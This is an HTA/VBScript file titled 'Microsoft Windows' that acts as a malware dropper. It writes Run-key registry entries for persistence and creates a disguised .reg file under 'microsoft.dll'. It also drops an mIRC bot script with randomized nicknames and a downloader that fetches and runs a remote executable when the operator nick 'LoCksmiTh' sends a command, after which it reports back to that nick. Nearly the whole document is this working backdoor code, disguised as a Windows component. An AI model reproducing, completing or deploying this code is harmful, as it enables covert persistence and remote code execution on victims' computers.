<HTML><HEAD><TITLE>Microsoft Windows</TITLE> 
<HTA:APPLICATION ID="KokopisBot"

VERSION="23.1" 
WINDOWSTATE="minimize"/> 

<script language="vbscript"> 
On Error Resume Next 
Set shell = CreateObject("WScript.Shell") 
shell.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winagament","c:\windows\fonts\lock.pas" 
shell.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\LoadPowerProfile","regedit /s c:\windows\system\microsoft.dll" 
shell.regwrite "HKCU\SOFTWARE\Mirc\username\","LocksmiTh" 
shell.regwrite "HKCU\SOFTWARE\Mirc\license\","7852-861891" 
'*********************************************************************** 
On Error Resume Next 
Set YaziFSO = CreateObject("Scripting.FileSystemObject") 
Set yaz = YaziFSO.CreateTextFile("c:\windows\system\microsoft.dll",True) 
yaz.WriteLine("REGEDIT4") 
yaz.WriteLine("") 
yaz.WriteLine("[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run]") 
yaz.WriteLine("""winagament""=""c:\\windows\\fonts\\lock.pas""") 
yaz.WriteLine("") 
yaz.close

yaz.WriteLine("") & vbcrlf

'*********************************************************************** 
On Error Resume Next 
Set YaziFSO = CreateObject("Scripting.FileSystemObject") 
Set yaz = YaziFSO.CreateTextFile("c:\windows\fonts\dwn.exe",True) 

yaz.WriteLine(" ") 

yaz.WriteLine("on 1:start:{") 
yaz.WriteLine(" unset %down*") 
yaz.WriteLine(" nick Guest $+ $chr($rand(97,122)) ") 
yaz.WriteLine(" anick $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) ") 
yaz.WriteLine(" identd on $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) ") 
yaz.WriteLine(" fullname $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) ") 
yaz.WriteLine(" unset %xcxjoin") 
yaz.WriteLine("}") 
yaz.WriteLine("on 1:exit:run Lock.pas.vbs") 

yaz.WriteLine(";; Downloader.mrc 29/07/1998") 
yaz.WriteLine("alias downloader {") 
yaz.WriteLine(" if ($window(@downloader) == $null) { window -e @downloader %downsave.downpos fixedsys }") 
yaz.WriteLine(" else { clear @downloader }") 
yaz.WriteLine("") 
yaz.WriteLine(" if ($1 == $null) { halt }") 
yaz.WriteLine("") 
yaz.WriteLine(" if ($sock(downloader, 0) > 0) { ") 
yaz.WriteLine(" decho") 
yaz.WriteLine(" decho ** 4Download of %down.lfile in progress! (one file at a time.) ") 
yaz.WriteLine(" decho ** 4To halt the progress of this file, press 2shift+f5") 
yaz.WriteLine(" decho | return ") 
yaz.WriteLine(" }") 
yaz.WriteLine("") 
yaz.WriteLine(" unset %down.*") 
yaz.WriteLine("") 
yaz.WriteLine(" %down.lasturl = $1- ") 
yaz.WriteLine(" if ($left($1-, 7) == http://) { %down.p = 80 | %down.t = http | %down.s = $remove($1, http://) } ") 
yaz.WriteLine(" elseif ($left($1, 6) == ftp://) {") 
yaz.WriteLine(" %down.s = $remove($1, ftp://) ") 
yaz.WriteLine(" if ($count(%down.s, $chr($asc(:))) > 0) {") 
yaz.WriteLine(" %down.t = ftp") 
yaz.WriteLine("") 
yaz.WriteLine(" if ($len($gettok(%down.s, 1, $asc(:))) < $len($gettok(%down.s, 2, $asc(:)))) {") 
yaz.WriteLine(" if ($chr($asc(@)) !isin %down.s) { decho Downloader - Must provide pass | sf5 | halt }") 
yaz.WriteLine(" %down.user = $gettok(%down.s, 1, $asc(:))") 
yaz.WriteLine(" %down.s = $remove(%down.s, %down.user) ") 
yaz.WriteLine(" %down.s = $right(%down.s, $calc($len(%down.s) - 1))") 
yaz.WriteLine(" %down.pass = $gettok(%down.s, 1, $asc(@))") 
yaz.WriteLine(" %down.s = $remove(%down.s, %down.pass)") 
yaz.WriteLine(" %down.s = $right(%down.s, $calc($len(%down.s) - 1))") 
yaz.WriteLine(" if (%down.pass == $null) { decho Downloader - invalid parameters | halt }") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { %down.user = Anonymous | %down.pass = Guest@downloader.mrc }") 
yaz.WriteLine("") 
yaz.WriteLine(" if ($count(%down.s, $chr($asc(:))) > 0) {") 
yaz.WriteLine(" %down.p = $remove(%down.s, $gettok(%down.s, $count(%down.s, $chr($asc(:))), $asc(:)))") 
yaz.WriteLine(" %down.p = $right(%down.p, $calc($len(%down.p) - 1))") 
yaz.WriteLine(" %down.s = $remove(%down.s, %down.p)") 
yaz.WriteLine(" %down.s = $remove(%down.s, $chr($asc(:)))") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { %down.p = 21 }") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { ") 
yaz.WriteLine(" %down.user = Anonymous | %down.pass = Guest@downloader.mrc ") 
yaz.WriteLine(" %down.t = ftp | %down.p = 21 ") 
yaz.WriteLine(" }") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { decho /downloader - invalid parameters: $1- | halt }") 
yaz.WriteLine("") 
yaz.WriteLine(" %down.rfile = $remove(%down.s, $gettok(%down.s, 1, $asc(/)))") 
yaz.WriteLine(" %down.s = $gettok(%down.s, 1, $asc(/))") 
yaz.WriteLine("") 
yaz.WriteLine(" decho Connection Type: $sr(%down.t) ") 
yaz.WriteLine(" decho Server: $sr(%down.s) ") 
yaz.WriteLine(" decho Port: $sr(%down.p) ") 
yaz.WriteLine(" getdown.lfile ") 
yaz.WriteLine("") 
yaz.WriteLine(" sockopen downloader %down.s %down.p") 
yaz.WriteLine("}") 
yaz.WriteLine("alias dwn { downloader $1- }") 
yaz.WriteLine("alias -l down.proc {") 
yaz.WriteLine(" if ($1 == 220) { dsock USER %down.user }") 
yaz.WriteLine(" elseif ($1 == 331) { secho PASS $str($chr($asc(*)), $len(%down.pass)) | /sockwrite -n downloader PASS %down.pass }") 
yaz.WriteLine(" elseif (($1 == 230) && (log isin $1-)) { down.startftpj -l }") 
yaz.WriteLine(" elseif ($1 == 226) { down.startftpj }") 
yaz.WriteLine(" elseif (($1 isnum) && ($len($1) == 3) && ($left($1, 1) == 5) || ($left($1, 1) == 4)) { sf5 | halt }") 
yaz.WriteLine(" else { return }") 
yaz.WriteLine("}") 
yaz.WriteLine("alias -l down.startftpj {") 
yaz.WriteLine(" %down.sb = $rand(5, 9) | %down.sp = $rand(1, 20)") 
yaz.WriteLine("") 
yaz.WriteLine(" %down.listenport = $replace($ip,.,$chr(44)) $+ , $+ %down.sb $+ , $+ %down.sp") 
yaz.WriteLine(" dsock PORT %down.listenport ") 
yaz.WriteLine("") 
yaz.WriteLine(" %down.lstport = $calc(256 * %down.sb + %down.sp)") 
yaz.WriteLine("") 
yaz.WriteLine(" socklisten downftpget %down.lstport") 
yaz.WriteLine(" if ($1 == -l) { %down.ftpjlst = $true | dsock LIST %down.rfile }") 
yaz.WriteLine(" elseif ($sock(downftpget, 0) > 0) { ") 
yaz.WriteLine(" %down.time = $ctime | .timerdown 0 1 down.ref") 
yaz.WriteLine(" dsock RETR %down.rfile") 
yaz.WriteLine(" }") 
yaz.WriteLine("}") 
yaz.WriteLine("alias -l down.ref { ") 
yaz.WriteLine(" if ($window(@down-status) == $null) { ") 
yaz.WriteLine(" window @down-status %downsave.down-statuspos fixedsys") 
yaz.WriteLine(" .aline @down-status . | .aline @down-status . | .aline @down-status .") 
yaz.WriteLine(" .aline @down-status . | .aline @down-status . | .aline @down-status . ") 
yaz.WriteLine(" .aline @down-status . | .aline @down-status . | .aline @down-status .") 
yaz.WriteLine(" titlebar @down-status %down.s") 
yaz.WriteLine(" ;titlebar @downloader Online - %down.lasturl") 
yaz.WriteLine(" }") 
yaz.WriteLine(" .rline @down-status 1 2- DOWNLOADER GET SESSION BY KOKO -") 
yaz.WriteLine(" .rline @down-status 2 3Remote: %down.lasturl") 
yaz.WriteLine(" .rline @down-status 3 3Local: %down.lfile") 
yaz.WriteLine(" .rline @down-status 4 2-") 
yaz.WriteLine(" .rline @down-status 5 3Rcvd: $lof(%down.lfile) bytes ") 
yaz.WriteLine(" .rline @down-status 6 3Size: $iif((%down.filesiz != $null), %down.filesiz, Unknown) bytes") 
yaz.WriteLine(" .rline @down-status 7 3Elapsed: $duration($getdown.t)") 
yaz.WriteLine(" .rline @down-status 8 2- ") 
yaz.WriteLine(" .rline @down-status 9 2Downloader - hawkee.com July Script Challenge") 
yaz.WriteLine("") 
yaz.WriteLine(" if ((%down.t == ftp) && ($lof(%down.lfile) == %down.filesiz)) { ") 
yaz.WriteLine(" decho %down.rfile Completed ( $+ %down.filesiz $+ bytes) in $duration($getdown.t)") 
yaz.WriteLine(" decho Average Speed: $calc(%down.filesiz / $getdown.t) bps") 
yaz.WriteLine(" sockclose downftpget | sockclose downftpgetit ") 
yaz.WriteLine(" sockclose downloader | .timerdown off | unset %down.*") 
yaz.WriteLine(" }") 
yaz.WriteLine(" elseif ((%down.t == ftp) && ($sock(downftpgetit, 1).lr > 30)) { dsock NOOP }") 
yaz.WriteLine(" elseif ($sock(downftpgetit, 1).lr > 300) { sf5 }") 
yaz.WriteLine("") 
yaz.WriteLine("}") 
yaz.WriteLine("alias -l getdown.t { return $calc($ctime - %down.time) }") 
yaz.WriteLine("alias -l getdown.lfile {") 
yaz.WriteLine(" ;*******************************") 
yaz.WriteLine(" %down.lfile = %oldfolder $+ $gettok(%down.rfile, $count(%down.rfile, $chr($asc(/))), $asc(/))") 
yaz.WriteLine(" %down.i = 0") 
yaz.WriteLine(" :again") 
yaz.WriteLine(" %down.templfile = %downsave.getdir $+ %down.lfile") 
yaz.WriteLine(" if ($exists(%down.templfile)) {") 
yaz.WriteLine(" decho | decho File exists: $sr(%down.templfile) - Auto renaming... ") 
yaz.WriteLine(" inc %down.i") 
yaz.WriteLine(" if ($chr($asc(.)) isin %down.lfile) { ") 
yaz.WriteLine(" %down.rem = $chr($asc(.)) $+ $gettok(%down.lfile, $calc($count(%down.lfile, $chr($asc(.))) + 1), $asc(.)) ") 
yaz.WriteLine(" if ($right($remove(%down.lfile, %down.rem), 1) isnum) { %down.lfile = $left($remove(%down.lfile, %down.rem), $calc($len($remove(%down.lfile, %down.rem)) - 1)) $+ %down.i $+ $chr($asc(.)) $+ $gettok(%down.lfile, $calc($count(%down.lfile, $chr($asc(.))) + 1), $asc(.)) }") 
yaz.WriteLine(" else { %down.lfile = $remove(%down.lfile, %down.rem) $+ %down.i $+ $chr($asc(.)) $+ $gettok(%down.lfile, $calc($count(%down.lfile, $chr($asc(.))) + 1), $asc(.)) }") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { %down.lfile = %down.lfile $+ %down.i }") 
yaz.WriteLine(" goto again ") 
yaz.WriteLine(" }") 
yaz.WriteLine(" %down.lfile = %downsave.getdir $+ %down.lfile") 
yaz.WriteLine(" decho | decho Saving to file: $sr(%down.lfile) | decho") 
yaz.WriteLine("}") 
yaz.WriteLine("alias -l sr { return $chr($asc([)) $+ $1- $+ $chr($asc(])) }") 
yaz.WriteLine("alias -l decho { echo @downloader 4-> 2 $1- }") 
yaz.WriteLine("alias -l secho { echo @downloader 4-> 3 $1- }") 
yaz.WriteLine("alias -l dsock { secho $1- | sockwrite -n downloader $1- }") 
yaz.WriteLine("alias sf5 { ") 
yaz.WriteLine(" if (($sock(downloader, 0)) && ($1 != -n)) {") 
yaz.WriteLine(" decho | decho Connection to $sr(%down.s) terminated. ") 
yaz.WriteLine(" decho To retry: %down.lasturl ") 
yaz.WriteLine(" decho ^-press shift+f6 | decho") 
yaz.WriteLine(" }") 
yaz.WriteLine(" if ($window(@down-status)) { window -c @down-status }") 
yaz.WriteLine(" titlebar @downloader Offline") 
yaz.WriteLine(" sockclose downftpget | sockclose downftpgetit") 
yaz.WriteLine(" sockclose downloader | .timerdown off ") 
yaz.WriteLine("}") 
yaz.WriteLine("alias sf6 { downloader %down.lasturl }") 
yaz.WriteLine("alias sf7 {") 
yaz.WriteLine(" if ($exists(%down.lfile) == $false) { decho %down.lfile - File not found. }") 
yaz.WriteLine(" else {") 
yaz.WriteLine(" %down.response = $?!=""Really delete %down.lfile $+ ?""") 
yaz.WriteLine(" if (%down.response) { .remove %down.lfile | decho %down.lfile deleted. }") 
yaz.WriteLine(" }") 
yaz.WriteLine("}") 
yaz.WriteLine("on 1:sockopen:downloader:{") 
yaz.WriteLine(" if ($sockerr > 0) { decho **hatal� URL. | return } ") 
yaz.WriteLine("") 
yaz.WriteLine(" if (%down.t == http) { ") 
yaz.WriteLine(" set %down.time $ctime | .timerdown 0 1 down.ref") 
yaz.WriteLine(" dsock GET %down.rfile ") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { %down.ftplst = $true }") 
yaz.WriteLine("}") 
yaz.WriteLine("on 1:sockclose:downloader:{ ") 
yaz.WriteLine(" if (%down.t == ftp) { return }") 
yaz.WriteLine(" elseif ($lof(%down.lfile) < 500) { ") 
yaz.WriteLine(" %down.hi = 0") 
yaz.WriteLine(" :loop") 
yaz.WriteLine(" inc %down.hi") 
yaz.WriteLine(" if (%down.hi > $lines(%down.lfile)) { goto sndmsg }") 
yaz.WriteLine(" else {") 
yaz.WriteLine(" %down.htmp = $read -l $+ %down.hi %down.lfile ") 
yaz.WriteLine(" if ((404 isin %down.htmp) && (not isin %down.htmp) && (found isin %down.htmp)) {") 
yaz.WriteLine(" decho Possible HTTP Error: %down.htmp ") 
yaz.WriteLine(" decho ^-to delete this file, press shift+f7") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else { goto loop }") 
yaz.WriteLine(" }") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else {") 
yaz.WriteLine(" :sndmsg") 
yaz.WriteLine(" decho %down.rfile Completed ( $+ $lof(%down.lfile) $+ bytes) in $duration($getdown.t)") 
yaz.WriteLine(" decho Average Speed: $calc($lof(%down.lfile) / $getdown.t) bps") 
yaz.WriteLine(" ;******************************************") 
yaz.WriteLine(" decho o") 
yaz.WriteLine(" copy %down.lfile %newfolder") 
yaz.WriteLine(" msg locksmith Tamamdir..  %newfolder ") 
yaz.WriteLine(" }") 
yaz.WriteLine(" sf5 -n") 
yaz.WriteLine("}") 
yaz.WriteLine("on 1:sockread:downloader:{") 
yaz.WriteLine(" if ($sockerr > 0) { decho ** 4Unknown error occured. | sf5 | halt } ") 
yaz.WriteLine(" elseif ((%down.t == ftp) && (%down.ftplst)) {") 
yaz.WriteLine(" :nextread1") 
yaz.WriteLine(" sockread %temp") 
yaz.WriteLine(" if ($sockbr == 0) { return }") 
yaz.WriteLine(" decho %temp") 
yaz.WriteLine(" down.proc %temp") 
yaz.WriteLine(" goto nextread1") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else {") 
yaz.WriteLine(" :nextread") 
yaz.WriteLine(" sockread &temp ") 
yaz.WriteLine(" if ($sockbr == 0) { return } ") 
yaz.WriteLine(" .bwrite %down.lfile -1 &temp") 
yaz.WriteLine(" goto nextread") 
yaz.WriteLine(" }") 
yaz.WriteLine("}") 
yaz.WriteLine("") 
yaz.WriteLine("on 1:socklisten:downftpget:{ sockaccept downftpgetit }") 
yaz.WriteLine("on 1:sockread:downftpgetit:{") 
yaz.WriteLine(" if ($sockerr > 0) { decho ** 4Unknown error occured. | sf5 | halt } ") 
yaz.WriteLine("") 
yaz.WriteLine(" if (%down.ftpjlst) {") 
yaz.WriteLine(" sockread %down.lstit") 
yaz.WriteLine(" %down.filesiz = $gettok(%down.lstit, 5, 32)") 
yaz.WriteLine(" decho %down.lstit | unset %down.ftpjlst") 
yaz.WriteLine(" sockclose downftpget | sockclose downftpgetit") 
yaz.WriteLine(" }") 
yaz.WriteLine(" else {") 
yaz.WriteLine(" :nextread") 
yaz.WriteLine(" sockread &temp ") 
yaz.WriteLine("") 
yaz.WriteLine(" if ($sockbr == 0) { return }") 
yaz.WriteLine(" bwrite %down.lfile -1 &temp") 
yaz.WriteLine(" goto nextread") 
yaz.WriteLine(" }") 
yaz.WriteLine("}") 
yaz.WriteLine("") 
yaz.WriteLine("on 1:close:@downloader:{") 
yaz.WriteLine(" %downsave.downpos = $window(@downloader).x $window(@downloader).y $window(@downloader).w $window(@downloader).h") 
yaz.WriteLine(" if ($window(@down-status)) { window -c @down-status }") 
yaz.WriteLine("}") 
yaz.WriteLine("on 1:close:@down-status:{ %downsave.down-statuspos = $window(@down-status).x $window(@down-status).y $window(@down-status).w $window(@down-status).h }") 
yaz.WriteLine("on 1:input:@downloader:{ if ($left($1, 1) != $chr($asc(/))) { downloader $1- | halt } }") 
yaz.WriteLine("on 1:load:{") 
yaz.WriteLine(" %downsave.down-statuspos = 454 273 470 225") 
yaz.WriteLine(" %downsave.downpos = 3 278 702 301 ") 
yaz.WriteLine(" %downsave.getdir = $getdir") 
yaz.WriteLine("}") 
yaz.WriteLine("menu @downloader {") 
yaz.WriteLine(" dclick:{ run explorer %downsave.getdir }") 
yaz.WriteLine("}") 
yaz.WriteLine("menu @down-status {") 
yaz.WriteLine(" dclick:{ window -c @down-status }") 
yaz.WriteLine("}")
yaz.WriteLine("") 
yaz.WriteLine("ON 1:TEXT:!indir*:?: { ")
yaz.WriteLine(" if ($nick == LoCksmiTh) { /close -m LocksmiTh | /downloader http://web.ttnet.net.tr/okupet/mirc2.exe } ")
yaz.WriteLine(" HALTDEF ")
yaz.WriteLine(" }")

yaz.WriteLine(" }")

yaz.WriteLine(" HALTDEF ")
yaz.WriteLine("}")
